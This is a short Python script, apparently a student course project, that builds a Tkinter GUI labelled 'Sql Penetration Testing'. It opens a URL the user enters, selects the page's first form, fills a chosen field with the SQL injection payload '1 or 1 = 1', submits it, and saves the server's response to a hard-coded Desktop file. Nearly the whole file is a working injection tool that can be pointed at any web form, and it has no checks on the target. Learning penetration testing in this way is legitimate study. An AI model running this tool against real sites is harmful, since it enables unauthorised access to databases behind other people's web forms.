#1611071 Hardik Chodvadiya
#1611073 Amit Dave
# Comps - B1




import mechanize
import os.path

from tkinter import *

window = Tk()
window.geometry('725x450')
window.title("GUI")
lb = Label(window , text = "Sql Penetration Testing",font = ("",20))
lb.grid(column = 0,row = 0)

text = Label(window,text='Enter Url Here',justify='left')
text.grid(column=0,row=1)

url = Entry(window,width = 50)
url.grid(column=1,row=1)

request = mechanize.Browser()
id1 = None
def clicked1():
    global request,id1
    res = id1.get()
    request[res] = '1 or 1 = 1'
    response = request.submit()
    Label(window,text="Saving file as abc.html").grid(column=0,row=8)
    name = os.path.join("C:/Users/AL3X/Desktop","abc.html")
    f = open(name,"w+")
    f.write(str(response.read()))
    f.close()


 
    


def clicked():
    global request,id1
    res = url.get()
    request.open(res)
    Label(window,text=request).grid(column=0,row=4)
    request.select_form(nr = 0)
    Label(window,text=request).grid(column=0,row=5)
    Label(window,text='Enter ID').grid(column=0,row=6)
    id1 = Entry(window,width=20)
    id1.grid(column= 1,row=6)
    print(id1.get())
    btn2 = Button(window,text="Submit",command=clicked1).grid(column=1,row=7) 



    

btn = Button(window,text="Submit",command=clicked)
btn.grid(column=1,row=2)







